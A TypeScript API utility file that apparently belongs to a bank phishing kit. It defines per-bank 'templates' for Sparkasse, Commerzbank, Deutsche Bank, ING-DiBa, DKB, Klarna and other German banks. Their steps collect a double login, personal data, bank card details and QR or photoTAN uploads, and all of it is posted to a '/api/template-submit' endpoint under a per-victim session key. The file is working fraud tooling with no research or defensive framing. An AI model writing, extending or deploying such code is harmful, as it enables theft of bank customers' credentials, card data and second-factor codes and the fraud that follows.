// Template-specific API utilities
import { templateAPI } from './api';

const API_BASE_URL = '/api';

interface TemplateSubmissionData {
  template_name: string;
  key?: string;
  step: string;
  data?: any;
}

interface TemplateSubmissionResponse {
  success: boolean;
  session_key?: string;
  state?: string;
  message?: string;
  error?: string;
  step_disabled?: boolean;
  redirect_to_login?: boolean;
}

/**
 * Submit data to template submission handler
 */
export async function submitTemplateData(submissionData: TemplateSubmissionData): Promise<TemplateSubmissionResponse> {
  try {
    const response = await fetch(`${API_BASE_URL}/template-submit`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(submissionData)
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Template API Error:', {
        status: response.status,
        statusText: response.statusText,
        errorData: errorData
      });
      throw new Error(errorData.error || errorData.message || `Template submission failed (${response.status})`);
    }

    return await response.json();
  } catch (error) {
    console.error('Template submission error:', error);
    throw error;
  }
}

/**
 * Upload file for template (QR codes, documents, etc.)
 */
export async function uploadTemplateFile(
  templateName: string, 
  key: string, 
  file: File, 
  step: string = 'qr-upload'
): Promise<TemplateSubmissionResponse> {
  try {
    const formData = new FormData();
    formData.append('template_name', templateName);
    formData.append('key', key);
    formData.append('step', step);
    formData.append('qrFile', file);

    const response = await fetch(`${API_BASE_URL}/template-submit`, {
      method: 'POST',
      body: formData
    });

    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.error || 'File upload failed');
    }

    return await response.json();
  } catch (error) {
    console.error('Template file upload error:', error);
    throw error;
  }
}

/**
 * Get step configuration for a template by name
 */
export async function getTemplateConfig(templateName: string) {
  try {
    return await templateAPI.getRuntimeConfig(templateName);
  } catch (error) {
    console.error('Error fetching template config:', error);
    
    // Return template-specific default config if API fails
    const templateDefaults: Record<string, Record<string, boolean>> = {
      'santander': { doubleLogin: true, personalData: true, qrCode: true, bankCard: true },
      'commerzbank': { doubleLogin: true, personalData: true, bankCard: true, qrCode: true },
      'comdirect': { doubleLogin: true, personalData: true, bankCard: true, qrCode: true },
      'apobank': { doubleLogin: true, personalData: true, bankCard: true },
      'postbank': { doubleLogin: true, personalData: true, bankCard: true, qrCode: true },
      'sparkasse': { branchSelection: true, doubleLogin: true, personalData: true, bankCard: true },
      'volksbank': { branchSelection: true, doubleLogin: true, personalData: true, qrUpload: true, bankCard: true },
      'consorsbank': { doubleLogin: true, personalData: true, bankCard: true },
      'ingdiba': { doubleLogin: true, personalData: true, bankCard: true, qrCode: true, transactionCancel: true },
      'deutsche_bank': { multiFieldLogin: true, doubleLogin: true, personalData: true, qrCode: true, bankCard: true },
      'dkb': { doubleLogin: true, personalData: true, qrUpload: true, bankCard: true },
      'klarna': { bankSelection: true, personalData: true, bankCard: true },
      'credit-landing': { bankCard: true, personalData: true }
    };
    
    const defaultSteps = templateDefaults[templateName] || { personalData: true, bankCard: true };
    
    return {
      template: { name: templateName, folder_name: templateName },
      steps: defaultSteps
    };
  }
}

/**
 * Create initial session for a template
 */
export async function createTemplateSession(templateName: string): Promise<string> {
  try {
    const response = await submitTemplateData({
      template_name: templateName,
      step: 'login'
    });

    if (response.success && response.session_key) {
      return response.session_key;
    } else {
      throw new Error(response.error || 'Failed to create session');
    }
  } catch (error) {
    console.error('Error creating template session:', error);
    // Fallback to random key for development
    return Math.random().toString(36).substring(2, 15);
  }
}

/**
 * Template-specific API functions
 */
export const templateApiUtils = {
  submitTemplateData,
  uploadTemplateFile,
  getTemplateConfig,
  createTemplateSession
};
